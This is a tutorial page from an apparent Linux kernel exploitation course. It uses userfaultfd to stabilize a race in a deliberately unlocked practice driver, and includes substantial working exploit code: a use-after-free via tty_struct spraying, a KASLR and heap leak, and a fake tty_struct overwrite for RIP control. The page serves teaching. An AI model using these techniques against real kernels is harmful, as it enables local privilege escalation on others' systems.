---
title: Using userfaultfd
tags:
    - [Linux]
    - [Kernel]
    - [Race Condition]
    - [Data Race]
    - [userfaultfd]
lang: en
permalink: /en/linux-kernel/LK04/uffd.html
pagination: true
fd: fuse.html
bk: ../LK03/double_fetch.html
---
In LK04 (Fleckvieh), we handle a race condition similar to the one studied in LK01-4 (Holstein v4), but under stricter conditions. First, download the files for [practice problem LK04](distfiles/LK04.tar.gz).

## Inspecting the driver
First, read the driver source code. This time the driver is larger than the previous ones and uses features and syntax we have not seen before. `module_open` looks like this:
```c
static int module_open(struct inode *inode, struct file *filp) {
  /* Allocate list head */
  filp->private_data = (void*)kmalloc(sizeof(struct list_head), GFP_KERNEL);
  if (unlikely(!filp->private_data))
    return -ENOMEM;

  INIT_LIST_HEAD((struct list_head*)filp->private_data);
  return 0;
}
```
First, notice the `unlikely` macro on line 4. In the Linux kernel it is [defined like this](https://elixir.bootlin.com/linux/v5.16.14/source/include/linux/compiler.h#L77), and you will see it very often.
```c
#define likely(x)      __builtin_expect(!!(x), 1)
#define unlikely(x)    __builtin_expect(!!(x), 0)
```
It lets the compiler know which side of a branch is more likely to be taken, for example in security checks or out-of-memory handling where one path is rarely executed. If the prediction is accurate, `likely`/`unlikely` can improve performance on hot paths.

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_suyasuya.png" alt="Wolf" ></div>
  <p class="says">
    If you give the compiler a hint, it can reduce the instruction count or branch count on the common path.
    This also relates to CPU branch prediction, so look it up if you are curious.
  </p>
</div>

Next, line 7 uses the `INIT_LIST_HEAD` macro. This initializes a `list_head`, the doubly linked list structure that also appeared with `tty_struct`. The driver stores this structure in `private_data` so that each opened file descriptor has its own list.
The list stores `blob_list` objects:
```c
typedef struct {
  int id;
  size_t size;
  char *data;
  struct list_head list;
} blob_list;
```
Items are inserted with `list_add`, removed with `list_del`, and iterated with helpers such as `list_for_each_entry(_safe)`. Look up the details as needed.

If you read the `ioctl` implementation, you will see that the module supports four commands: `CMD_ADD`, `CMD_DEL`, `CMD_GET`, and `CMD_SET`.
```c
static long module_ioctl(struct file *filp,
                         unsigned int cmd,
                         unsigned long arg) {
  struct list_head *top;
  request_t req;
  if (unlikely(copy_from_user(&req, (void*)arg, sizeof(req))))
    return -EINVAL;

  top = (struct list_head*)filp->private_data;

  switch (cmd) {
    case CMD_ADD: return blob_add(top, &req);
    case CMD_DEL: return blob_del(top, &req);
    case CMD_GET: return blob_get(top, &req);
    case CMD_SET: return blob_set(top, &req);
    default: return -EINVAL;
  }
}
```
`CMD_ADD` appends a `blob_list` to the list. Each `blob_list` contains up to 0x1000 bytes of data, and the contents are user-controlled. When a blob is added, it receives a random ID, which is returned to user space as the `ioctl` return value. The user then refers to that ID in later operations.
`CMD_DEL` deletes the corresponding `blob_list` when given an ID.
`CMD_GET` copies data from the matching `blob_list` into a user buffer using the specified ID, buffer, and size.
Finally, `CMD_SET` copies data from user space into the matching `blob_list`.

Like previous modules, this driver stores user data, but Fleckvieh manages it with a list, so it can hold multiple items at once.

## Confirming the bug
If you studied all of LK01, the vulnerability is obvious. There is no locking anywhere, so data races are easy to create. However, exploiting this race introduces a problem.
Because the data is managed through the relatively complex doubly linked list structure, trying to read or write data while another thread deletes it may hit the unlink path itself, corrupting the links or the heap state. Then you end up with crashes during the race, or with no reliable way to tell whether you actually created a Use-after-Free.
Let's verify that by writing a race.
```c
int fd;

int add(char *data, size_t size) {
  request_t req = { .size = size, .data = data };
  return ioctl(fd, CMD_ADD, &req);
}
int del(int id) {
  request_t req = { .id = id };
  return ioctl(fd, CMD_DEL, &req);
}
int get(int id, char *data, size_t size) {
  request_t req = { .id = id, .size = size, .data = data };
  return ioctl(fd, CMD_GET, &req);
}
int set(int id, char *data, size_t size) {
  request_t req = { .id = id, .size = size, .data = data };
  return ioctl(fd, CMD_SET, &req);
}

int race_win;

void *race(void *arg) {
  int id;
  while (!race_win) {
    id = add("Hello", 6);
    del(id);
  }
}

int main() {
  fd = open("/dev/fleckvieh", O_RDWR);
  if (fd == -1) fatal("/dev/fleckvieh");

  race_win = 0;

  pthread_t th;
  pthread_create(&th, NULL, race, NULL);

  int id;
  for (int i = 0; i < 0x1000; i++) {
    id = add("Hello", 6);
    del(id);
  }
  race_win = 1;
  pthread_join(th, NULL);

  close(fd);
  return 0;
}
```
This code repeatedly adds and deletes data from multiple threads. If the race triggers, the links in the doubly linked list become corrupted, and the final `close` crashes while freeing the list contents.

So does that mean races on complex data structures are impossible to exploit?

## What is userfaultfd?
To exploit races under complex conditions like this, or to raise the success probability of a race to nearly 100%, there is a technique that abuses a Linux feature called **userfaultfd**.

If Linux is built with `CONFIG_USERFAULTFD`, the `userfaultfd` feature becomes available. userfaultfd is a system call that lets user space handle page faults.

For a user without `CAP_SYS_PTRACE` to use `userfaultfd` with all permissions, the `unprivileged_userfaultfd` flag must be 1. This flag is exposed through `/proc/sys/vm/unprivileged_userfaultfd`. Its default is 0, but on the LK04 machine it is set to 1.

The user receives a file descriptor from the `userfaultfd` syscall, then configures handlers and address ranges through `ioctl`. When a page fault occurs in a registered page (that is, on first access), the configured handler is invoked, and user space decides what backing data should be supplied for that page. The overall flow looks like this:

<center>
  <img src="img/uffd.png" alt="Processing flow of userfaultfd" style="width:720px;">
</center>

When a page fault occurs, the registered user-space handler runs. That means the thread that tried to read the page blocks until another thread running the handler supplies data. The same applies even when the page access originated from kernel space, so we can suspend kernel execution precisely at a memory read or write.

## Example use of userfaultfd
Let's try the following code:
```c
#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

static void* fault_handler_thread(void *arg) {
  char *dummy_page;
  static struct uffd_msg msg;
  struct uffdio_copy copy;
  struct pollfd pollfd;
  long uffd;
  static int fault_cnt = 0;

  uffd = (long)arg;

  dummy_page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (dummy_page == MAP_FAILED) fatal("mmap(dummy)");

  puts("[+] fault_handler_thread: waiting for page fault...");
  pollfd.fd = uffd;
  pollfd.events = POLLIN;

  while (poll(&pollfd, 1, -1) > 0) {
    if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
      fatal("poll");

    /* wait for a page fault */
    if (read(uffd, &msg, sizeof(msg)) <= 0) fatal("read(uffd)");
    assert (msg.event == UFFD_EVENT_PAGEFAULT);

    printf("[+] uffd: flag=0x%llx\n", msg.arg.pagefault.flags);
    printf("[+] uffd: addr=0x%llx\n", msg.arg.pagefault.address);

    /* choose the data returned for the requested page */
    if (fault_cnt++ == 0)
      strcpy(dummy_page, "Hello, World! (1)");
    else
      strcpy(dummy_page, "Hello, World! (2)");
    copy.src = (unsigned long)dummy_page;
    copy.dst = (unsigned long)msg.arg.pagefault.address & ~0xfff;
    copy.len = 0x1000;
    copy.mode = 0;
    copy.copy = 0;
    if (ioctl(uffd, UFFDIO_COPY, &copy) == -1) fatal("ioctl(UFFDIO_COPY)");
  }

  return NULL;
}

int register_uffd(void *addr, size_t len) {
  struct uffdio_api uffdio_api;
  struct uffdio_register uffdio_register;
  long uffd;
  pthread_t th;

  /* create a userfaultfd */
  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  if (uffd == -1) fatal("userfaultfd");

  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
    fatal("ioctl(UFFDIO_API)");

  /* register the pages */
  uffdio_register.range.start = (unsigned long)addr;
  uffdio_register.range.len = len;
  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
    fatal("UFFDIO_REGISTER");

  /* create a thread that handles page faults */
  if (pthread_create(&th, NULL, fault_handler_thread, (void*)uffd))
    fatal("pthread_create");

  return 0;
}

int main() {
  void *page;
  page = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE,
              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (page == MAP_FAILED) fatal("mmap");
  register_uffd(page, 0x2000);

  /* use printf carefully because puts/futex in the thread can hang */
  char buf[0x100];
  strcpy(buf, (char*)(page));
  printf("0x0000: %s\n", buf);
  strcpy(buf, (char*)(page + 0x1000));
  printf("0x1000: %s\n", buf);
  strcpy(buf, (char*)(page));
  printf("0x0000: %s\n", buf);
  strcpy(buf, (char*)(page + 0x1000));
  printf("0x1000: %s\n", buf);

  getchar();
  return 0;
}
```
This code passes a page address and length to `register_uffd`. That function spawns a handler thread called `fault_handler_thread`.
When a page fault occurs, the `read` inside `fault_handler_thread` receives the event and returns data for the faulting page. In this sample program, the returned data depends on how many faults have happened so far.

Inside `main`, we allocate two pages[^1] and register them with `userfaultfd`. The first two `strcpy` calls fault on first access and therefore invoke the `userfaultfd` handler. If the handler is called twice and the returned contents show up as expected, then it worked:

<center>
  <img src="img/uffd_sample.png" alt="Example use of userfaultfd" style="width:480px;">
</center>

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_normal.png" alt="Wolf" ></div>
  <p class="says">
    The userfaultfd handler runs in a separate thread, so it may execute on a different CPU from the main thread.
    If you allocate objects inside the handler and the heap cache differs by CPU, the UAF may fail, so use <code>sched_setaffinity</code> to pin the CPU.
  </p>
</div>

## Stabilizing the race
Now let's actually use `userfaultfd` in an exploit.
With `userfaultfd`, we can switch control from kernel space back to user space exactly when a page fault occurs. Since the fault happens on first read or write to the registered user-space page, in this driver we can suspend execution inside `copy_from_user` or `copy_to_user`. In other words, we can stop execution in the following places:

- `copy_from_user` inside `blob_add`
- `copy_to_user` inside `blob_get`
- `copy_from_user` inside `blob_set`

Because our goal is a Use-after-Free, we can pause execution in one of those functions and call `blob_del` while the target operation is still in progress. If we delete during `blob_get`, we get a UAF read; if we delete during `blob_set`, we get a UAF write. Let's try reading and writing a `tty_struct` that way.
The overall flow is:

<center>
  <img src="img/uffd_uafr.png" alt="Use-after-Free using userfaultfd" style="width:720px;">
</center>

We call `blob_get` on a `victim` buffer allocated from the same size class as `tty_struct` (`kmalloc-1024`). If we pass an address registered with `userfaultfd`, then `copy_to_user` inside `blob_get` page-faults and invokes the handler. Because there is no locking, the handler can call `blob_del`, freeing `victim`.
If we then spray `tty_struct`, a TTY object is allocated in the just-freed slot. When the handler returns and `copy_to_user` resumes, data is copied from the old `victim` address, which now actually contains the sprayed `tty_struct`, so the TTY object is leaked into user space.
Calling `blob_set` gives the analogous UAF write. Let's confirm it in code.
```c
cpu_set_t pwn_cpu;

int victim;
char *buf;

static void* fault_handler_thread(void *arg) {
  static struct uffd_msg msg;
  struct uffdio_copy copy;
  struct pollfd pollfd;
  long uffd;
  static int fault_cnt = 0;

  /* run on the same CPU as the main thread */
  if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
    fatal("sched_setaffinity");

  uffd = (long)arg;

  puts("[+] fault_handler_thread: waiting for page fault...");
  pollfd.fd = uffd;
  pollfd.events = POLLIN;

  while (poll(&pollfd, 1, -1) > 0) {
    if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
      fatal("poll");

    /* wait for a page fault */
    if (read(uffd, &msg, sizeof(msg)) <= 0) fatal("read(uffd)");
    assert (msg.event == UFFD_EVENT_PAGEFAULT);

    /* choose the page contents to return */
    switch (fault_cnt++) {
      case 0: {
        puts("[+] UAF read");
        /* [1-2] page fault from `blob_get` */
        // free victim
        del(victim);

        // spray tty_struct so it overlaps victim
        int fds[0x10];
        for (int i = 0; i < 0x10; i++) {
          fds[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
          if (fds[i] == -1) fatal("/dev/ptmx");
        }

        // page data buffer (will be overwritten by copy_to_user anyway)
        copy.src = (unsigned long)buf;
        break;
      }

      case 1:
        /* [2-2] page fault from `blob_set` */
        // free victim
        break;
    }

    copy.dst = (unsigned long)msg.arg.pagefault.address;
    copy.len = 0x1000;
    copy.mode = 0;
    copy.copy = 0;
    if (ioctl(uffd, UFFDIO_COPY, &copy) == -1) fatal("ioctl(UFFDIO_COPY)");
  }

  return NULL;
}

...

int main() {
  /* make sure both main and handler run on the same CPU */
  CPU_ZERO(&pwn_cpu);
  CPU_SET(0, &pwn_cpu);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
    fatal("sched_setaffinity");
    
  fd = open("/dev/fleckvieh", O_RDWR);
  if (fd == -1) fatal("/dev/fleckvieh");

  void *page;
  page = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE,
              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (page == MAP_FAILED) fatal("mmap");
  register_uffd(page, 0x2000);

  buf = (char*)malloc(0x400);
  victim = add(buf, 0x400);
  set(victim, "Hello", 6);

  /* [1-1] UAF Read: leak tty_struct */
  get(victim, page, 0x400);
  for (int i = 0; i < 0x80; i += 8) {
    printf("%02x: 0x%016lx\n", i, *(unsigned long*)(page + i));
  }

  return 0;
}
```

The code is long, but it does exactly what the diagram described. It confirms that a Use-after-Free can be triggered with essentially 100% reliability.

<center>
  <img src="img/test_uaf.png" alt="Testing Use-after-Free" style="width:480px;">
</center>

If you inspect the leaked data in the figure above, you may notice that the beginning of `tty_struct` was not copied correctly. (The first `0x30` bytes are zero even though fields such as `tty_operations` should be there.)
That happens because `copy_to_user` was called with a large size. `copy_to_user` starts copying from the beginning of the `victim` region. The page fault occurs only when it tries to write to the destination page, so the earliest bytes are copied before the UAF state takes effect.
Fortunately, the size of each internal copy loop in `copy_to_user` depends on the overall copy size. So if we call `copy_to_user` with a small size such as `0x20`, only the first `0x10` bytes come from before the UAF, while the remaining `0x10` bytes, including the `tty_operations` pointer, come from after the UAF.

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_thinking.png" alt="Wolf" ></div>
  <p class="says">
   If you do not know exactly at which assembly instruction the page fault occurs, debugging looks painful.
  </p>
</div>

Once we can leak KASLR and heap addresses, we can build a UAF write in the same way.
As usual, we overwrite a fake `tty_struct` whose `ops` points to a fake function table, but note that the address used for the UAF this time may differ from the one leaked earlier. The leaked heap address corresponds to the `tty_struct` freed by `close`, so first spray a fake `tty_operation` onto that leaked heap slot. (Here we simply reuse the same 0x400 chunk for both `tty_operation` and `tty_struct`.)
```c
      case 2: {
        puts("[+] UAF write");
        /* [3-2] page fault from `blob_set` */
        // spray fake tty_operation over the leaked kheap
        for (int i = 0; i < 0x100; i++) {
          add(buf, 0x400);
        }

...

  /* [2-1] UAF Read: leak tty_struct (heap) */
  victim = add(buf, 0x400);
  get(victim, page+0x1000, 0x400);
  unsigned long kheap = *(unsigned long*)(page + 0x1038) - 0x38;
  printf("kheap = 0x%016lx\n", kheap);
  for (int i = 0; i < 0x10; i++) close(ptmx[i]);
```
Once we have prepared a fake function table at the leaked address, we trigger the UAF again just like before:
```c
        // free victim and spray tty_struct
        del(victim);
        for (int i = 0; i < 0x10; i++) {
          ptmx[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
          if (ptmx[i] == -1) fatal("/dev/ptmx");
        }

        // page buffer that will be written by copy_from_user
        copy.src = (unsigned long)buf;
```
This time it is a UAF write, so we need to control the bytes that get written. Those bytes come from `copy.src`, so let's prepare a fake `tty_struct` beforehand:
```c
  /* [3-1] UAF Write: overwrite tty_struct */
  memcpy(buf, page+0x1000, 0x400);
  unsigned long *tty = (unsigned long*)buf;
  tty[0] = 0x0000000100005401; // magic
  tty[2] = *(unsigned long*)(page + 0x10); // dev
  tty[3] = kheap; // ops
  tty[12] = 0xdeadbeef; // ops->ioctl
  victim = add(buf, 0x400);
  set(victim, page+0x2000, 0x400);
```
If RIP control works, then the hard part is done. Complete the final privilege-escalation stage yourself.

<center>
  <img src="img/fleck_privesc.png" alt="Privilege escalation on Fleckvieh" style="width:480px;">
</center>

The sample exploit code can be downloaded [here](exploit/fleckvieh_uffd.c).

---

<div class="column" title="Exercise">
  This time we used userfaultfd only to stabilize the race.
  If data is placed across page boundaries, however, it becomes possible to stop execution when reading or writing a specific member inside a structure.
  Think about situations where that technique would make exploitation easier.
</div>

[^1]: We do not use `MAP_POPULATE` because we want the first access to fault.
[^2]: If you call `printf` directly here, the fault may happen inside `printf`, and then the `puts`/`printf` in the handler can deadlock on buffering. In the kernel-exploit context, since the fault originates from kernel space, this particular issue is less important.
